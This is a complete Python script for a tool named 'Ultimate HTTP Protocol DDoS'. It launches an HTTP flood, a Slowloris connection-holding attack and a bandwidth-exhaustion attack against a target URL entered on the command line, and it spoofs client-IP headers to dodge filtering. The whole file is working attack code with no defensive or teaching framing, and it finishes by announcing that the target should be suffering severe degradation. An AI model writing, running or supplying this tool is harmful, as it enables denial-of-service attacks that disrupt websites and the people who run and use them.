# Python 3.7+

import requests
import threading
import time
import random
import sys
import os
import socket
import urllib3
import argparse
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class UltimateHTTPDDoS:
    def __init__(self):
        self.is_attacking = False
        self.request_count = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = 0
        self.attack_stats = {}
        self.user_agents = self._load_user_agents()
        self.referers = self._load_referers()
        self.headers_pool = self._create_headers_pool()
        
    def _load_user_agents(self):
        """Load a large list of user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36',
            'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
        ]
    
    def _load_referers(self):
        """Load a list of referers"""
        return [
            'https://www.google.com/search?q=',
            'https://www.bing.com/search?q=',
            'https://www.yahoo.com/',
            'https://www.facebook.com/',
            'https://www.twitter.com/',
            'https://www.linkedin.com/',
            'https://www.reddit.com/',
            'https://www.youtube.com/',
            'https://www.amazon.com/',
            'https://www.github.com/'
        ]
    
    def _create_headers_pool(self):
        """Create a pool of different header combinations"""
        headers_list = []
        for _ in range(50):
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Referer': random.choice(self.referers),
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Requested-With': 'XMLHttpRequest' if random.random() > 0.5 else '',
                'DNT': '1' if random.random() > 0.7 else '',
                'TE': 'Trailers' if random.random() > 0.5 else ''
            }
            headers_list.append(headers)
        return headers_list
    
    def _print_banner(self):
        """Print attack banner"""
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ██████╗ ██████╗ ██████╗      ██████╗██╗███████╗███████╗    ║
║ ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝██║██╔════╝██╔════╝    ║
║ ██║   ██║██║  ██║██║  ██║    ██║     ██║███████╗███████╗    ║
║ ██║   ██║██║  ██║██║  ██║    ██║     ██║╚════██║╚════██║    ║
║ ╚██████╔╝██████╔╝██████╔╝    ╚██████╗██║███████║███████║    ║
║  ╚═════╝ ╚═════╝ ╚═════╝      ╚═════╝╚═╝╚══════╝╚══════╝    ║
║                                                              ║
║                Ultimate HTTP Protocol DDoS                   ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
    
    def _print_stats(self):
        """Print real-time attack statistics"""
        elapsed = time.time() - self.start_time
        rps = self.request_count / elapsed if elapsed > 0 else 0
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║                    {Fore.YELLOW}ATTACK STATISTICS{Fore.CYAN}                    ║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.GREEN}Requests Sent: {Fore.WHITE}{self.request_count:>10} {Fore.CYAN}                     ║")
        print(f"║ {Fore.GREEN}Successful: {Fore.WHITE}{self.successful_requests:>12} {Fore.CYAN}                     ║")
        print(f"║ {Fore.RED}Failed: {Fore.WHITE}{self.failed_requests:>15} {Fore.CYAN}                     ║")
        print(f"║ {Fore.YELLOW}RPS: {Fore.WHITE}{rps:>18.1f} {Fore.CYAN}                     ║")
        print(f"║ {Fore.MAGENTA}Elapsed Time: {Fore.WHITE}{elapsed:>12.1f}s {Fore.CYAN}                   ║")
        print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def _http_flood_worker(self, target_url, thread_id, requests_per_second):
        """Worker thread for HTTP flood"""
        session = requests.Session()
        session.verify = False
        session.timeout = 3
        
        while self.is_attacking:
            try:
                # Random HTTP method
                method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
                
                # Random endpoint
                endpoints = ['/', '/index.php', '/api/v1/test', '/admin', '/login', '/api', '/wp-admin', '/static']
                endpoint = random.choice(endpoints)
                
                # Random parameters
                params = {f'param{random.randint(1,10)}': random.randint(1, 1000000)}
                
                # Random headers from pool
                headers = random.choice(self.headers_pool)
                
                # Add random cookies
                if random.random() > 0.5:
                    headers['Cookie'] = f'session_id={random.randint(1000000, 9999999)}'
                
                if method == 'GET':
                    response = session.get(
                        f"{target_url.rstrip('/')}{endpoint}",
                        headers=headers,
                        params=params
                    )
                elif method == 'POST':
                    # Random POST data
                    data = {
                        'username': f'user{random.randint(1, 100000)}',
                        'password': f'pass{random.randint(1, 100000)}',
                        'email': f'email{random.randint(1, 100000)}@example.com',
                        'token': str(random.random())[2:10]
                    }
                    response = session.post(
                        f"{target_url.rstrip('/')}{endpoint}",
                        headers=headers,
                        data=data
                    )
                else:
                    response = session.request(
                        method,
                        f"{target_url.rstrip('/')}{endpoint}",
                        headers=headers
                    )
                
                with threading.Lock():
                    self.request_count += 1
                    self.successful_requests += 1
                
                # Control request rate
                if requests_per_second > 0:
                    time.sleep(1.0 / requests_per_second)
                    
            except Exception as e:
                with threading.Lock():
                    self.request_count += 1
                    self.failed_requests += 1
                continue
    
    def _slowloris_worker(self, target_url, sockets_per_thread=50):
        """Slowloris attack worker"""
        host = target_url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
        port = 443 if 'https://' in target_url else 80
        
        sockets = []
        
        # Create multiple sockets
        for _ in range(sockets_per_thread):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                
                # Send initial headers
                s.send(f"GET /?{random.randint(1, 10000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                sockets.append(s)
            except:
                continue
        
        # Keep connections alive
        while self.is_attacking and sockets:
            for s in sockets[:]:
                try:
                    s.send(f"X-{random.randint(1000, 9999)}: {random.randint(1, 10000)}\r\n".encode())
                    time.sleep(random.randint(15, 45))
                except:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def _resource_exhaustion_worker(self, target_url):
        """Request heavy resources"""
        heavy_files = [
            '/large-file.zip',
            '/video.mp4',
            '/database-backup.sql',
            '/installer.exe',
            '/document.pdf',
            '/archive.tar.gz',
            '/backup.rar',
            '/image-collection.jpg'
        ]
        
        session = requests.Session()
        session.verify = False
        
        while self.is_attacking:
            try:
                file = random.choice(heavy_files)
                url = f"{target_url.rstrip('/')}{file}"
                
                headers = random.choice(self.headers_pool)
                headers['Range'] = f'bytes={random.randint(0, 50000000)}-{random.randint(50000001, 100000000)}'
                
                response = session.get(url, headers=headers, stream=True, timeout=5)
                
                # Read chunks to consume bandwidth
                chunk_size = random.randint(8192, 65536)
                for _ in range(random.randint(10, 50)):
                    next(response.iter_content(chunk_size=chunk_size), None)
                
                with threading.Lock():
                    self.request_count += 1
                    self.successful_requests += 1
                
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                with threading.Lock():
                    self.request_count += 1
                    self.failed_requests += 1
                continue
    
    def start_attack(self, target_url, total_threads=50, attack_duration=300, requests_per_second=10):
        """Start the ultimate HTTP DDoS attack"""
        self._print_banner()
        
        print(f"\n{Fore.YELLOW}[*] Target URL: {Fore.WHITE}{target_url}")
        print(f"{Fore.YELLOW}[*] Total Threads: {Fore.WHITE}{total_threads}")
        print(f"{Fore.YELLOW}[*] Attack Duration: {Fore.WHITE}{attack_duration} seconds")
        print(f"{Fore.YELLOW}[*] Requests per Second per Thread: {Fore.WHITE}{requests_per_second}")
        print(f"{Fore.RED}[!] Attack starting in 3 seconds...{Style.RESET_ALL}")
        
        time.sleep(3)
        
        self.is_attacking = True
        self.request_count = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = time.time()
        
        threads = []
        
        # Calculate thread distribution
        http_flood_threads = int(total_threads * 0.5)  # 50% HTTP Flood
        slowloris_threads = int(total_threads * 0.3)   # 30% Slowloris
        resource_threads = int(total_threads * 0.2)    # 20% Resource Exhaustion
        
        print(f"\n{Fore.GREEN}[+] Spawning {http_flood_threads} HTTP Flood threads...")
        for i in range(http_flood_threads):
            t = threading.Thread(
                target=self._http_flood_worker,
                args=(target_url, i, requests_per_second),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        print(f"{Fore.GREEN}[+] Spawning {slowloris_threads} Slowloris threads...")
        for i in range(slowloris_threads):
            t = threading.Thread(
                target=self._slowloris_worker,
                args=(target_url,),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        print(f"{Fore.GREEN}[+] Spawning {resource_threads} Resource Exhaustion threads...")
        for i in range(resource_threads):
            t = threading.Thread(
                target=self._resource_exhaustion_worker,
                args=(target_url,),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        print(f"\n{Fore.GREEN}[✓] All {total_threads} threads are active!")
        print(f"{Fore.CYAN}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}\n")
        
        # Monitor and display stats
        try:
            while time.time() - self.start_time < attack_duration and self.is_attacking:
                time.sleep(2)
                os.system('cls' if os.name == 'nt' else 'clear')
                self._print_stats()
                
                if time.time() - self.start_time >= attack_duration:
                    print(f"\n{Fore.YELLOW}[!] Attack duration reached. Stopping...")
                    break
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack interrupted by user")
        
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop all attack threads"""
        self.is_attacking = False
        time.sleep(2)  # Give threads time to stop
        
        elapsed = time.time() - self.start_time
        rps = self.request_count / elapsed if elapsed > 0 else 0
        
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════╗")
        print(f"║                    {Fore.YELLOW}ATTACK COMPLETE{Fore.RED}                      ║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.GREEN}Total Requests: {Fore.WHITE}{self.request_count:>10} {Fore.RED}                     ║")
        print(f"║ {Fore.GREEN}Average RPS: {Fore.WHITE}{rps:>14.1f} {Fore.RED}                     ║")
        print(f"║ {Fore.GREEN}Total Time: {Fore.WHITE}{elapsed:>15.1f}s {Fore.RED}                    ║")
        print(f"║ {Fore.YELLOW}Target should be experiencing severe service degradation{Fore.RED} ║")
        print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Ultimate HTTP Protocol DDoS Tool')
    parser.add_argument('-u', '--url', help='Target URL (e.g., http://example.com)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('-d', '--duration', type=int, default=300, help='Attack duration in seconds (default: 300)')
    parser.add_argument('-rps', '--rate', type=int, default=10, help='Requests per second per thread (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url:
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║             {Fore.YELLOW}Ultimate HTTP DDoS Tool Configuration{Fore.CYAN}           ║")
        print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        target = input(f"\n{Fore.GREEN}[?] Enter target URL (e.g., http://example.com): {Fore.WHITE}")
        if not target.startswith('http'):
            target = 'http://' + target
        
        threads = input(f"{Fore.GREEN}[?] Number of threads (default 50): {Fore.WHITE}")
        threads = int(threads) if threads.isdigit() else 50
        
        duration = input(f"{Fore.GREEN}[?] Attack duration in seconds (default 300): {Fore.WHITE}")
        duration = int(duration) if duration.isdigit() else 300
        
        rps = input(f"{Fore.GREEN}[?] Requests per second per thread (default 10): {Fore.WHITE}")
        rps = int(rps) if rps.isdigit() else 10
    else:
        target = args.url
        threads = args.threads
        duration = args.duration
        rps = args.rate
    
    # Validate target URL
    if not target or not target.startswith('http'):
        print(f"{Fore.RED}[!] Invalid URL. Please include http:// or https://")
        sys.exit(1)
    
    # Create and start attack
    ddos = UltimateHTTPDDoS()
    
    try:
        ddos.start_attack(target, threads, duration, rps)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack cancelled by user")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")

if __name__ == "__main__":
    main()